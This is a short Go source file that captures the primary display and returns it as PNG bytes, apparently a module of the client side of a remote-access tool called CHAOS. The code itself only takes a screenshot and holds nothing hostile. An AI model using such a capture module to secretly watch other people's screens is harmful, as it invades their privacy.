package screenshot

import (
	"bufio"
	"bytes"
	"github.com/justadoll/CHAOS/client/app/services"
	"github.com/kbinani/screenshot"
	"image/png"
)

type ScreenshotService struct{}

func NewScreenshotService() services.Screenshot {
	return &ScreenshotService{}
}

func (s ScreenshotService) TakeScreenshot() ([]byte, error) {
	display, err := screenshot.CaptureDisplay(0)
	if err != nil {
		return nil, err
	}
	var body bytes.Buffer
	writer := bufio.NewWriter(&body)
	if err := png.Encode(writer, display); err != nil {
		return nil, err
	}
	return body.Bytes(), nil
}
